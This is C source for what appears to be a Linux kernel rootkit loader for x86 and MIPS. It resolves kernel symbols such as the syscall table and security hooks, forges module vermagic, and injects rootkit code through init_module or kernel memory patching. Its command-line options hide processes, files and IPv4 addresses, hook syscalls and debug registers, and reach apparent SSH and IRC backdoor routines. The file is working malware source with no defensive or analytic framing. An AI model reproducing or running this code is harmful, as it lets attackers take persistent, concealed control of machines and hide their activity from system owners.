#include <cdefs.h>
#include <defs.h>
#include <libc.h>
#include <arch.h>
#include <unistd.h>
#include <libmem.h>
#include <libio.h>
#include <opsig.h>

extern void kstart();
extern void kend();
extern void kdbstart();
extern void klibstart();
extern void kenter();
extern void opsigstart();

extern unsigned long rkopsig(struct opref *, int);

extern struct kargs rkargs;
extern struct ksyms rksyms;
static unsigned long *_rksyms = (unsigned long *)&rksyms;
extern unsigned long  _rkmod_size;
extern unsigned char *_rkmod_start;

static unsigned int klen;
static unsigned long got_offset;

SYSCALL1(exit, int);
SYSCALL1(close, int);
SYSCALL1(wait, int *);
SYSCALL1(rkctl, void *);
SYSCALL3(open, char *, int, int);
SYSCALL1(uname, void *);
SYSCALL2(stat, char *, struct stat *);
SYSCALL3(read, int, void *, unsigned long);
SYSCALL3(write, int, void *, unsigned long);
SYSCALL3(lseek, int, unsigned long, int);
SYSCALL3(getdents64, int, struct linux_dirent *, unsigned int);
SYSCALL3(init_module, unsigned char *, unsigned long, char *);
SYSCALL4(ptrace, int, int, void *, void *);
SYSCALL6(mmap, void *, unsigned long, int, int, int, unsigned long);
SYSCALL0(getppid);

unsigned long
rkino(char *path)
{
	struct stat sb;

	if (stat(path, &sb) == -1) {
		exit(-1);
	}
	return sb.st_ino;
}

#ifdef __IA32__
REGPARM(2) int
reloc(unsigned long base, void (*pk)(char *, ...))
{
	unsigned char *start, *end, *p;
	unsigned long *word;
	int n = 0;

	start = (unsigned char *)&kstart;
	end   = (unsigned char *)&kend;

	for (p = start; p < end; p++) {
		word = (unsigned long *) p;
		if ((*word) >= (unsigned long)start && (*word) <= (unsigned long)end) {
			*word = (base+((*word)-(unsigned long)start));
			p += 3;
			n++;
		}
	}
	pk("[%d] relocs\n", n);
	return (n);
}
#endif

#ifdef __AMD64__
void
reloc(unsigned long kbase) {}
#endif

#ifdef __MIPS32__

#define IRS_SHIFT (5)
#define ROP_RT    (31)
#define IOP_RT    (31)
#define IOP_RS    (31<<IRS_SHIFT)
#define REG_AT    (1)

void
reloc(unsigned long base, void *pk)
{
	struct opref opref;
	unsigned char *start, *end, *rstart, *rend, *addr, *p;
	unsigned char lui[4] = {'\x3c', '\x01', '\x00', '\x00'};
	unsigned char ori[4] = {'\x34', '\x21', '\x00', '\x00'};
	unsigned int op,op1,op2;
	unsigned long gp,val,gp_off;

	__asm__ __volatile__("move %0, $28\n" : "=r"(gp));

	start  = (unsigned char *)&kstart;
	end    = (unsigned char *)(start+klen);
	rstart = (unsigned char *)base;
	rend   = (unsigned char *)(rstart+klen);

	opref.nb_max = 0;
	opref.addr = rstart;
	opref.end  = rend;
	while ((rkopsig(&opref, LW_GP)) != -1) {
		op = *(unsigned short *)(opref.addr);
		op = (op & (~IOP_RS)) | (REG_AT<<IRS_SHIFT);
		*(unsigned short *)(opref.addr) = op;
		opref.addr += 4;
	}

	opref.addr = rstart;
	while ((rkopsig(&opref, LW_GP_SP)) != -1) {
		op = *(unsigned short *)(opref.addr);
		op = (op & (~IOP_RT)) | (REG_AT);
		*(unsigned short *)(opref.addr) = op;
		opref.addr += 4;
	}

	opref.addr = rstart;
	while ((rkopsig(&opref, SW_GP_SP)) != -1) {
		op = *(unsigned short *)(opref.addr);
		op = (op & (~IOP_RT)) | (REG_AT);
		*(unsigned short *)(opref.addr) = op;
		opref.addr += 4;
	}

	opref.addr = rstart;
	rkopsig(&opref, LUI_GP);
	addr  = opref.addr;

	gp_off = *(unsigned char *)(addr+3);
	gp_off <<= 16;
	gp_off += *(unsigned short *)(addr+6);
	gp_off -= (unsigned long)start;
	gp_off = (base+gp_off);

	*(unsigned short *)(lui+2) = (gp_off>>16);
	*(unsigned short *)(ori+2) = (gp_off&0x0000FFFF);
	op1 = *(unsigned int *)lui;
	op2 = *(unsigned int *)ori;

	opref.addr = rstart;
	while ((rkopsig(&opref, LUI_GP)) != -1) {
		*(unsigned int *)(opref.addr)   = op1;
		*(unsigned int *)(opref.addr+4) = op2;
		opref.addr += 4;
	}

	for (p = rstart; p < rend; p+=4) {
		val = *(unsigned long *)p;
		if ((val >= 0x410000) && (val <= end)) {
			val -= (unsigned long)start;
			val = (base+val);
			*(unsigned long *)p = val;
		}
	}
	p = (unsigned char *)rkmemmem(rstart,25500, "\x00\x5c\x10\x21", 4);
	if (p) {
		op = *(unsigned short *)(p);
		op = ((op & (~ROP_RT)) | (REG_AT));
		*(unsigned short *)p = op;
	}
	__asm__ __volatile__("move $28,%0\n" : : "r"(gp));
}
#endif

#ifdef __MIPS32__
void
exkend()
{
        unsigned long start = (unsigned long)&kstart;
        unsigned long end = (unsigned long)&kend;
		unsigned long *p  = (unsigned long *)end;
        unsigned long val;

        klen = 0xd34db4b0;
        while ((val=*p) != klen) {
                if (!got_offset && ((val >= start) && (val <= end)))
                        got_offset = (unsigned long)p;
                p++;
        }
        klen = end-start;
        klen += ((unsigned long)p-end-4);
}
#endif

static int
fsymproc()
{
	char buf[256];
	char v[64] = { '0', 'x' };
	char *p;
	int nsyms, fd, i, data = 0, cnt = 0;
	char *syms[] =
		{ "do_debug",
		  "vmalloc",
		  "__kmalloc",
		  "vfs_stat",
		  "kern_path",
		  "printk",
		  "_raw_spin_lock_irqsave",
		  "_raw_spin_unlock_irqrestore",
		  "packet_rcv",
		  "tpacket_rcv",
		  "raw_rcv",
		  "tcp4_seq_show",
		  "tcp6_seq_show",
		  "consume_skb",
		  "iterate_dir",
		  "vfree",
		  "panic",
		  "proc_root_readdir",
		  "show_vfsmnt",
		  "r4k_flush_icache_range",
		  "sys_call_table",
		  "system_call",
		  "d tcp4_seq_afinfo",
		  "d tcp6_seq_afinfo",
		  "ip_mc_output",
		  "ip_options_build",
		  "current_task",
		  "cpu_number",
		  "num_processors",
		  "mounts_op",
		  "vfs_readdir",
		  "notify_change",
          "fnotify_change",
		  "proc_root_operations",
		  "handle_sys",
		  "do_bp",
		  "security_ops",
		  "security_task_getscheduler"
		};

	fd = opensyms();
	nsyms = sizeof(syms)/sizeof(char *);
	while (readline(buf, fd) != -1) {
		p = buf;
		while (*p != ' ') p++;
		*p = '\0';
		data = 0;
		if (*(p+1) == 'd')
			data = 1;
		p += 3;
		for (i = 0; i < nsyms; i++) {
			char *s = syms[i];
			if (data && *s != 'd')
				continue;
			if (data)
				s += 2;
			if (!rkstrcmp(p, s)) {
				/* copy sym addr into _rksyms */
				cnt++;
				rkstrcpy(&v[2], buf);
				_rksyms[i] = rkstrtoul(v+2, 16);
				printf("[%s] at 0x%x\n", p, _rksyms[i]);
			}
		}
		if (cnt >= nsyms) {
			close(fd);
			break;
		}
	}
	if (!panic) {
		printf("kallsyms all null\n");
		exit(0);
	}
	return 1;
}

#if 0

void
opsethookvec(void)
{
	unsigned long saveaddr, secop;

	/* 1. set hook vec */
	rkm(&secop, secops, sizeof(void*));
	rkm(&saveaddr, secop + secoff, sizeof(void*));
	wkml((unsigned long)&kmtramp, secop + 0x190);
	rktrig();
	wkml(saveaddr, secop + secoff);
	if (!kmem) {
		printf("vmalloc() allocation failed\n");
		exit(-1);
	}
	printf("kmem at: 0x%x\n", kmem);

	/* 2. relocate our rootkit from &kmem */
	reloc(kmem);

	/* 3. write rk code to vmalloc()'d area */
	if (wkm(&kstart, kmem, klen) != klen) {
		printf("kenter() fail\n");
		exit(0);
	}

	/* 4. trigger kenter() & final restore */
	kinit = kmem + ((unsigned long)&kenter) - ((unsigned long)&kstart); 
	wkml((unsigned long)&kinitramp, secop + secoff);
	rktrig();
	wkml(saveaddr, secop + secoff);
}

int
fixvermagic(unsigned char *m, unsigned long sz)
{
	char modpath[256] = { "/lib/modules/" };
	char deppath[256];
	char vermagic[64];
	struct utsname un;
	struct stat sb;
	unsigned char *p;
	unsigned int vlen;
	int fd;

	uname(&un);
	rkstrcat(modpath, un.release);
	rkstrcpy(deppath, modpath);
	rkstrcat(deppath, "/modules.dep");

	if (stat(deppath, &sb) == -1) {
		/* we have to guess vermagic */
		return 0;
	}

	fd = open(deppath, O_RDONLY, 0);
	memset(deppath, '\0', sizeof(deppath));
	vlen = readline(deppath, fd);
	deppath[vlen-1] = 0;
	rkstrcat(modpath, "/");
	rkstrcat(modpath, deppath);
	close(fd);

	if (stat(modpath, &sb) == -1) 	{
		/* we have to guess vermagic */
		return 0;
	}

	fd = open(modpath, O_RDONLY, 0);
	m = (unsigned char *) mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	p = (unsigned char *) memmem(m, sb.st_size, "vermagic", 7);
	rkmemcpy(vermagic, (char *)p, sizeof(vermagic));
	printf("vermagic: %s\n", vermagic);
	close(fd);

	/* fix mod_version */
	p = (unsigned char *)(&_rkmod_start);
	rkmemcpy((char *)p, "\x11\x17\xfd\x56", 4);
	p++;

	rkstrcpy((char *)p, "module_layout");
	p = (unsigned char *) memmem(m, sz, "vermagic", 8);
	vlen = rkstrlen(vermagic);
	rkmemcpy((char *)p, vermagic, vlen);
	*(unsigned char *)(p+vlen+1) = '\0';
	return 1;
}

#endif

int
rkinsmod(void)
{
	unsigned char *m = (unsigned char *)&_rkmod_start;
	unsigned long *p;

#ifdef __AMD64__
	/* mov %gs:current */
	p = (unsigned long *)memmem(&kstart, klen, __CURRENT, 4);
	*(unsigned short *)p = rksyms.current;
	/* mov %gs:cpu_number */
	p = (unsigned long *)memmem(&kstart, klen, __CPU_NUM, 4);
	*(unsigned short *)p = rksyms.cpu_number;
#endif
	/* fix syms in the rkmod */
	p = (unsigned long *)memmem(m, (unsigned long)&_rkmod_size, "\x3f\xb3\xad\xde", 4);
	if (!p)
		p = (unsigned long *)memmem(m, (unsigned long)&_rkmod_size, "\xde\xad\xb4\xb0", 4);
	p++;

	/* fix kstart/kend/kenter/reloc in kmodd.o */
	*p++ = (unsigned long)&kstart;
	*p++ = (unsigned long)klen;
	*p++ = (unsigned long)&kenter;
	*p++ = (unsigned long)&reloc;

	/* init mod! */
	if (init_module(m, (unsigned long)&_rkmod_size, "")) {
		printf("init_module fail\n");
		exit(-1);
	}
	return 0;
}

int
kcall(int cmd, char *arg)
{
	static struct rkops rk;
	int res = 0;

	switch (cmd) {
		case 'p':
			rk.cmd = RKHPID;
			rk.arg = rkstrtoul(arg, 10);
			if (rk.arg <= 0 || rk.arg > MAXPID)
				return -1;
			break;
		case 'P':
			rk.cmd = RKUHPID;
			rk.arg = rkstrtoul(arg, 10);
			break;
		case 'f':
			rk.cmd = RKHFILE;
			rk.arg = rkino(arg);
			break;
		case 'F':
			rk.cmd = RKUHFILE;
			rk.arg = rkino(arg);
			break;
		case '4':
			rk.cmd = RKADDIP4;
			if ((rk.arg=rkinet4addr(arg)) == -1) {
				printf("ipv4 iz broken\n");
				return -1;
			}
			break;
		case 'H':
			rk.cmd = RKMHOOK;
			rk.arg = (unsigned long)arg;
			break;
		case 'S':
		case 'D':
			rk.cmd = RKSUSP;
			break;
		case 'c':
			rk.cmd = RKCONT;
			break;
	}
	rkctl(&rk);
	return (res);
}

static void
setenv(void)
{
	char buf[32];
	int pid;

	pid = getppid();
	rkitoa(buf, pid, 10);
	kcall('p', buf);
}

#ifdef __IA32__
asm (".globl _start    \n"
     "_start:          \n"
     " xor %ebp, %ebp  \n"
     " pop %esi        \n"
     " mov %esp, %ecx  \n"
     " andl $~15, %esp \n"
     " pushl %ecx      \n"
     " pushl %esi      \n"
     " call main       \n"
     " mov %eax, %edi  \n"
     " xor %eax, %eax  \n"
     " inc %eax        \n"
     " int $0x80       \n"
);
#endif

#ifdef __AMD64__
asm (".globl _start    \n"
     "_start:          \n"
     " xor %ebp, %ebp  \n"
     " movq %rdx, %r9  \n"
     " popq %rdi       \n"
     " movq %rsp, %rsi \n"
     " andq $~15, %rsp \n"
     " push %rax       \n"
     " push %rsp       \n"
     " call main       \n"
     " movq %rax, %rdi \n"
     " xorq %rax, %rax \n"
     " movb $0x3c, %al \n"
     " syscall         \n"
     " hlt             \n"
);
#endif

#ifdef __MIPS32__
asm(".globl __start       \n"
    "__start:             \n"
    ".set noreorder       \n"
    " move $0, $31        \n"
    " bal 1f              \n"
    " nop                 \n"
    "1:                   \n"
    ".cpload $31          \n"
    " move $31, $0        \n"
    ".set reorder         \n"
    " lw $a0, 0($sp)      \n"
    " addiu $a1, $sp, 4   \n"
    " and $sp, -8         \n"
    " addiu $sp, $sp, -32 \n"
    " sw $sp, 24($sp)     \n"
    " la $t9, main        \n"
    " jalr $t9            \n"
    " nop                 \n"
    " li $s0, 4001        \n"
    " move $v0, $s0       \n"
    " li $a0, 55          \n"
    " syscall             \n"
);

#endif

void
usage()
{
	printf ("%s\n", "-p pid\t\tprocess pid\n"
	        "-P pid\t\tunhide process pid\n"
	        "-f file\t\tfile path\n"
	        "-F file\t\tunhide file path\n"
	        "-m\t\tinject rk via lkm\n"
	        "-k\t\tinject rk via kmem\n"
	        "-d\t\tuse DR regs to supervise\n"
	        "-s\t\tuse sct hooks to supervise\n"
	        "-S\t\tunhook sct/stop supervising\n"
	        "-D\t\tsuspend DR supervision\n"
	        "-c\t\tcontinue/rehook supervision\n"
	        "-4\t\thide ipv4 address\n"
	        "-u\t\tuninstall rk\n"
	);
}

int
main(int argc, char *argv[])
{
	int ifmode, op;

	if (argc < 2) {
		usage();
		exit(0);
	}

	klen = ((unsigned char *)&kend)-((unsigned char *)&kstart);
	printf("kstart:  %x\n", kstart);
	printf("kenter:  %x\n", &kenter);
	printf("kend:    %x\n", &kend);
	printf("klen:    %d\n", klen);
	while ((op=getopt(argc, argv, "4:p:P:f:F:Z:ImkdsDSuc"))) {
		switch (op) {
			case 'p':
			case 'P':
			case 'f':
			case 'F':
			case 'S':
			case 'D':
			case 'c':
			case '4':
				exit(kcall(op, optarg));
			case 'd':
				rkargs.spmode = MODED;
				break;
			case 'k':
				ifmode = RKMEMPATCH;
				break;
			case 'Z':
				rkssh(rkatoi(argv[2]), argv[3]);
				exit(0);
			case 'I':
				rkirc();
				exit(0);
			default:
			usage();
			exit(0);
		}
	}
#ifdef __MIPS32__
	exkend();
#endif
	if (fsymproc()) {
		rkinsmod();
	}
	setenv();
	return 0;
}
